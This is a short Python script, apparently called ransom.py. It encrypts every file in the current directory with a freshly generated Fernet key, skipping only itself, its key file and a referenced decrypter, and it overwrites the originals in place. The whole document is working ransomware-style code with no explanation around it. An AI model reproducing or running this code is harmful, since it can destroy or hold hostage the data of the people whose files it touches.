from cryptography.fernet import Fernet
import os

files = []

for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()
#print(key)

with open("generatedkey.key","wb") as generatedkey:
    generatedkey.write(key)


for file in files:
    with open(file, "rb") as the_File:
        contents = the_File.read()

    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file,"wb") as the_File:
        the_File.write(contents_encrypted)